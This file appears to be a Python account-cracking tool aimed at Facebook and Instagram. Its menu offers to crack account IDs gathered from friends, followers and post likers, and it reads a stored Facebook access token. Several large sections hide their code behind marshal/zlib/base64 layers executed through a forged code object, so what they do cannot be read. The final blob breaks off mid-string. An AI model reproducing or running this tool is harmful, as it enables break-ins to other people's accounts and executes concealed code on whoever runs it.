#!/usr/bin/python3
#-*-coding:utf-8-*-
#
import os, sys, re, time, requests, calendar, random
import requests,mechanize,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json,ipaddress
from random import randint
from urllib.parse import quote
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
current = datetime.now()

p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\x1b[0;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""

### HEADERS ###

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def banner():
	os.system("clear")
	print("""\033[1;91m
 ____                     _
|  _ \ _ __ ___ _ __ ___ \x1b[0;33m(_)_   _ _ __ ____
| |_) | '__/ _ \ '_ ` _ \| | | | | '_ ` _  |
\x1b[0;32m| __/ | |\x1b[0;36m |  __/ | | | | | | |_| | | | | | |
|_|   |_|  \___\033[1;91m|_| |_| |_|_|\__,_|_| |_| |_|\n""")

_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'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', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'T.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()

### MAIN MENU ###

def menu():
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print((R+"["+p+"•"+R+"]"+R+" Error : %s"%e))
        logs()
    ip = requests.get("https://api.ipify.org").text
    os.system("clear")
    banner()
    print("\033[1;91m[×]--------------------------------------------[×]")
    print("\033[1;91m[×]\x1b[0;37m Developer : Muhammad Dicky Wahyudi         \033[1;91m[×]")
    print("\033[1;91m[×]--------------------------------------------[×]")
    print("\033[1;91m[×]"+p+" Hello     : [ "+a["name"]+p+" ]")
    print("\033[1;91m[×]\x1b[0;37m Your ID   : "+id)
    print("\033[1;91m[×]\x1b[0;37m Your IP   : "+ip)
    print("\033[1;91m[×]\x1b[0;37m Status    : \033[1;91mFree User")
    print("\033[1;91m[×]--------------------------------------------[×]")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m1\033[1;91m]\x1b[0;37m Crack ID From Public/Friend \033[1;91m")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m2\033[1;91m]\x1b[0;37m Crack ID From Followers \033[1;91m")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m3\033[1;91m]\x1b[0;37m Crack ID From Like Post \033[1;91m")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m4\033[1;91m]\x1b[0;37m Get ID Public \033[1;91m")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m5\033[1;91m]\x1b[0;37m Get ID Followers \033[1;91m")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m6\033[1;91m]\x1b[0;37m Result Crack")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m7\033[1;91m]\x1b[0;37m Cek Opsi Akun "+p+"["+R+"CHECKPOINT"+p+"] \033[1;91m")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m8\033[1;91m]\x1b[0;37m Setting User Agent")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m9\033[1;91m]\x1b[0;37m Lapor Bug")
    print("\033[1;91m[\x1b[0;37m1\x1b[0;37m0\033[1;91m]\x1b[0;37m Crack instagram \033[1;91m")
    print("\033[1;91m[\x1b[0;37m0\x1b[0;37m0\033[1;91m]\x1b[0;37m Logout")
    print("\033[1;91m[×]--------------------------------------------[×]")
    choose_menu()

_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'eJztWUtsG8cZ3tkHuVxSFPWwZNmOs1JsJ8pDL8vPOE78iBsnseLWbp1QUIUVZyWtSC6p2WFtE8sgqIOgKHowekkQoACdQ1AHRdFDjz01PRRFDj3vMc3Fl6BAYKDQqf8/+5BEmXIfubSI5Z359///eezu/33/zPBvUsc/Ga5X4PrmChRUouR9qShRmSpQE6pSDWqZpmgaaoXqNAO1Sg2ahVqjOdoDdYrmaS/UaVqgfVDrtP+alLk/UOocyIDrAlzeBNxxGOwOIRInVL5DWsm9D3VZZjNwrwi7fEci0l3i/gMsaln2Xodai+oUeBa5gh5cjfz+Cvo02BnUelRnwO+nXNvm92vQG2D/GOpsVKPfZzy1ze890OfA/keoe6I6D35f8HTk8WPQ9ILlK6gLUd0HHl9zPfI4A5r+snyXeDmQBhJpECU2xDOR3yDo9gjrLEhDiTQs/M5wA/3cr0GzV9iKII0k0j7htcSzwuvPoNkvbPgEBxLpCeH1M54TXp+A5qCwfbpNelJ4/Zb3CC8fNKawfQHSaCKNgSSzA80DPE+fEl+rt12gh+6h1Ictb0julCrx/rIBfnuJ1AJLswDf9rBPhiRscUM6BoHXIu+St6V3JFd+W3LzYD+y+e2pdE0af3oukBpPQPDsn59+8dR0df7zDz//cGH//NSLR09UzatOxVk1T5vNA7F5dHTBvOw55kXbXbFc87ztWiwg04E8NV1UpqamAzID8gzKRwNyFGSoZovy1CyqZgNyDORjKB8LyHGQj6N8PCAnQD6B8omAnAT5JMonA3IK5FMogzA9BcL0VECmQIny1FRj35a5f/neJ/B/wby+arllz3yn1tgosKr5Als2K7UVx53gt3hjz/YGC+arjNWYedjr7GohfHx4ymtWxVodHwi0OnNcHmiOW2/wQK3abiNI1RtLFadczFCnVL4N78QLUsu1SqV2M0iB3mZe5FIKMqEeVEWV2Z4X6CW7vFire06xF/tabHg2W7RWbJcX9YpVr7GlxkoxL0yO63FrhVluoK3BbNxArkHH3m2P29VAtW85PMi8eqtk17lTc8flgMBXse9LbAyeaWNw0qMli9FJWnKqk9e4xSbqt4NsabVW8+xF7J8gfbyJhEL05M8ge0lqRxleB8Wld1yyaGWQfmLKOmGHoL8S6WArOWar30hb2EpCtiJb75WoVqNai+pUxG5pYDeSsBsBTkoBRoFrwgj3BQrcS2AxwMK5EmlmQZMFzQdcjTRjoMmB5iOuRZpCZz8CKz1zG+koPhrjO8MuBs0FZpXK5g2Hr5pXbL5ao3bz+dg18pmK6ulIv2DGjc/VneZkF++ZHd5XlizPKTWPd2lwdEeDS8y2zUtWyV6q1cpMgYdoPPkIAEXuMfzHSeh6YBtP7CSCcZmp4MI0KEBOoZwOZR3lDMop1o/yABSBUccRSvjCiuqSVXeKurjhvBJJy8tLEM3qslOxi2qZWasiosPiKSyOQPEshtMzHdGrb4vkLRdGJrbalkezW/PoRxCzzX6MLYhKuU3uSS1k3OeBceWywc4SCf+4EsWo2taoKrhZZLiQbe+SpgkeYdSmMWpbpHmc6+0MTftkGHLoMOTkYekeacncaGd9eS0HsgJtMr5CjRGwhTzuPgvj9sC4v0/GzYpeFZoTdX5z1C399yT9qytSSxNjqGKMFPSfH4HcOiy1e3FxcU9upbnkp2n/Hbml+yk6MCJdlBbOtjK+1i74GToI3nugv0w4L3xWX2/37bTQodB6l6zL4NF/L5zvMB/w4U2EmYkP+oDdG4AoeK49kMEI+yVkMENksCG61ze2ZTDjXSPOYAKFI3MbmYTNmYlxeaSTuKP4vQBB7tiT12tlOyJx1of+Jzr8Y3S8YXOnbD5dtZ82f+jyRhnwC8FdXXIq5uWL5nW7arkNs0tbdLDYis0BLxv7Vzmve6cnJ4Gx66sTyxHgJkq16uRG/mWrVAL6X+Q4r5ce7u/S45xVtaCzQHWtqv1wt3EdapXNc9R6ONb1wapLVsXB21Mnqs2xyWXm2C71Xq44VYe/NA2JdOrItlkFxrLDPL6IY29oE2tezd0gZkAWA3IzUKnFrUB26IZy5qWzATEao12+wPUat8TLOw0J9uHBLtMLMzC63B8O1FrddgNIkBYN0pffEraQMpB+GK5ViioEgBdSiM7s9YbtcS9Q4OUHKs400Co1i3qByu1bPNDfsG+HvWDqD9LMrlfggwQpqw4j0UC7yRxuB1qpAtkwUCq2K+iBITEynPL9bKDhW+FFxaFQrNXKkH7rIvbYMeyTNIvy+npRvu0FxGKjCUNt0tSemFvOCJqSIUXmBSHliCooSiZDIA8KrQ7SEOjxHj32kTHQFURiFT11p672t0NdzyTUpUQJNx0m3IjCdEExma4UZgDFZB9BYX9Ixs9Fvfc8ksLC/vO7UlgvUE9BUFgf7U8obCCisMEOCtszIsgJpGwHhXVY6HBCYcYWCtv7GAr7eAuFjTyGwvbNMcxWIXl15N8FswtrscPo/eJ/RF2X4oVn49ku7ROPbUTGcJnDsA17DovnsXgBiwkomkcmvcaSV2LOEjSMuGRmJ5ewSWwxhcU0FjNYHMViNkYQO44F8vLDTiqJZ7iNSthJ9D+FxWuPQNtQhBHvbBe0/Rt4i/v6Dm//H3jrXCwky/bdYHemS357DO7ehA2gebXm8cZTXTpIPMLI3gRcY5dlgY2eHVgcncTd5raM/t/AkOHB1WNQNgzF+98SyoY7UZaHKxOjDNaH0dawJTVfwaMtwJPclgFthCttlcJWzifL8lCIDa2dAmykBTZ0qkHspkakOELc8xBDGcDGWoQNA5EGdTbCxBjYc2D/eRc7RBWgI0QILONhTikYJdwu4lwMmEsKZqOI2aTFbNJiNrqvY8wDTvoBJ2q7BzCQGxHRv/6Fr4L+k5bRfFf00uMbyRNlRR9Z0UeuOebnol4GWz2Ath6/J+4FMNQPT3gwfEJAyWvRM+g0j/OLEU97fYMWeB4RdkcFZGrt3nviWGn9q6Tt+0nbvrDt+ldvw8ULyeFR/9xuy+Gr4tQDQzUB38YLuyyMD3vbF8aHvW0HU4/AAOQBREEDV4fG/Je/+sWCuQW+Xef2eqMK5ghwGOzNs7tOq2O1fNg70jHPTQBtHPvXeup80G5gv8qcn1jc3uiPjZcvxrbNM7noecT+JLY2DnchnHPlhguuDAa2zGt1q3q/Tyyk2WkscHnBXsICMc1exuIVLM5hIVbh57HA+RY1sQ1jyI3sIhbfgwLX0bbFwoVzHjYJnF1GZ6XGbzI8YSqmuVWtN9yVosZxxkUFXmtRsaiFy2snILfEmyyqoJkpqqCaCchSJ/fsheJTpIaLgnuQafLAIzHXGKJEHgqZaBDkHHCNLlgqByVyUSFqU4A/0eN3DPS/x0CdmXULA20uareSEJtDzuiklhgfHdQygtSS+D2OYeJOdjLM+d15Yec6ejeWYW/h1AY7B4/Igl3FAUdiU/ISdhLH6IK5gw7Y93GAa49I9/gq/vKtQg573HY+jKeMWgy5P0EBIU58qQ3Au0cg3H4H0CK+fAfgV4aprefX834Iwk297M1FsrJFVssyq/ikrfgy1aLlaHiXCu+gJ3G/xfJIP3En4ZjxHU0nkp5ImbhPCFJjTiy4HuDTPcAD0geaYMTpmaNFDYrZY8WUZ922gBIzS45XdSoQPMWU5a457sq4GmhevQI0GrKr+JaCbscVwcrFNLO9RoV7AXE6Plmgr9iuzSAm/o4v1BTfTYUvAF9J1skhkAoyfjf8M8SijC100qC2lQY/EDQI9AfbBY5bBjmqFahBpmq4BeEK+GhdfFLo05LC3xPZj8JfBGETpeEvi0CqKSTViCbTQIOfxTSwS58ZnvFBQsoLZxARjbRLGwNqg2d9IPU7JJr3bv7Z0MfHSFxryRB5OZqDry+3FF9p99Ae3DgBIefhLkd70RK2aB4EolNpYUSK9XDXNyLdkUU62AfP2btWWOsTpBclhXhruK7CZqify9FGqD+hvoG5pmzMNzCoAP0bZKE5aF6xvEbZcs1LTsU2S3U8Id0g8820UAAVKTEHNvcKlQc8h3+bR4ijzb5op32uVKo1XDwFaPaaVyGne7Z5w3L4xMSEoLQGBoYJQ5vJ7wJALsZ8RC5giFQLZlMxnzMfYDA9QLQ3DRjRmD9/7sIbC+MDYlURkB8EpB4uRPbFq5Egg4eAFce1vXCRcVB4rgaKx5mAA8OgZEVEgV5atUvlRViP4PIlMOz4xzAv6L1Qc127hDfhOSAy57gWaPirggeYg3e2uGStNYpa1a7a5WKqXHN5rQILFIc7tJMHcX4pkvzicAj+dJKKtj+zZErc5wBNg6A7GG12RKu58Yz4TSw8X8SDPHG6IDY/Yv0hGFFAMHwLY9IOGg70M9UabVTss/gqvylAoY/rI7qpj+pj+iH9iD70T5hRY24=', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'T.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()

_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'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